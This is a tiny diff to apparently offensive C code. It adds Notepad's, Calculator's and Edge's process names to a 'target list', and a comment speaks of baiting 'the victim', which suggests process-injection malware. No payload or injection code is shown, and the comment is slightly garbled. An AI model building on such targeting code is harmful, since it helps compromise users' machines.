@@ -12,6 +12,8 @@
 const char *processes[] = {
     "notepad.exe",
     "calc.exe",
+    "calculator.exe",
+    "msedge.exe",
 };
 
 /* Get the process id of any running process from the target list. If none exists, baits the victim waits */
